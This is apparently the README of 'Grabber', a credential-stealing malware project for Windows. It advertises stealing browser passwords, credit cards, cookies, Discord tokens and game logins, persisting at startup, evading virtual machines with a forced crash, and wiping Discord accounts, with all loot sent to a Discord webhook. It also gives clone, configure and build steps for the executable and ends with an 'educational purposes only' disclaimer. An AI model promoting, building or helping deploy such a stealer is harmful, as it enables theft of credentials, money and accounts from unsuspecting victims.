<div align="center">
    <h1>Grabber</h1>
    <a href="https://github.com/JustYuuto/Grabber/issues">
        <img alt="GitHub issues" src="https://img.shields.io/github/issues/JustYuuto/Grabber?style=for-the-badge">
    </a>
    <img alt="Lines of code" src="https://img.shields.io/tokei/lines/github/JustYuuto/Grabber?style=for-the-badge">
    <img alt="GitHub code size in bytes" src="https://img.shields.io/github/repo-size/JustYuuto/Grabber?style=for-the-badge">
    <a href="https://github.com/JustYuuto/Grabber/wiki">
        <img alt="Read Docs" src="https://img.shields.io/badge/Read-Docs-blue?style=for-the-badge">
    </a>
</div>

--------------------------

## Functionalities

Some of these functionalities are customisable in the [`config.js`](config.js) file. You can find more details in [the wiki](https://github.com/JustYuuto/Grabber/wiki/Functionalities). Items in bold are functionalities you can get hyped with!

* Made for Windows, but can work on macOS and Linux with Wine
* Can add itself to startup programs
* Can get IP info
* Can get OS info: RAM, OS version, computer name...
* Can get Windows product key
* Can kill Discord processes
* **Can get Chrome-based browsers logins and passwords, credit cards, cookies, history** 
* Can get Minecraft and Roblox logins
* Can trigger a BSOD if the grabber is run from a virtual machine
* **Can get Discord token** (killing the Discord client is not needed)
* Can nuke/destroy Discord accounts:
  * Delete all owned servers

Everything is sent through a Discord Webhook.

## Using it

### Requirements

To use and build this grabber, you'll need to download these things:

* [Node.js](https://nodejs.org/en)
* Visual Studio Build Tools
* [Python](https://www.python.org/downloads/)
* [nasm](https://www.nasm.us/)
* Minimum knowledge in using JavaScript objects, booleans and strings

### Getting the code

You can:
* [download zip](https://github.com/JustYuuto/Grabber/archive/refs/heads/master.zip)
* or use git:
  ```bash
  git clone https://github.com/JustYuuto/Grabber.git
  ```

### Configuration

Some things need to be configured (in the [`config.js`](config.js) file) before building the final exe, like the Webhook URL. If you don't know how to create a webhook, [you can learn it](https://support.discord.com/hc/en-us/articles/228383668). You can [click here](https://github.com/JustYuuto/Grabber/wiki/Configuration) for documentation about configuration items.

### Building the executable

After configuring the grabber, we can finally build it! Run the following command in the project folder:

```bash
npm run build
# or with yarn
yarn build
```

As you don't have a compiled node.js with nexe, nexe will build what sounds like a "custom node.js". 

## Todo

See [TODO.md](TODO.md) file.

## Responsibility

I, Yuuto, and other contributors, will not accept any responsibility case for damage done using this tool. This was made for educational and demonstration purposes only.
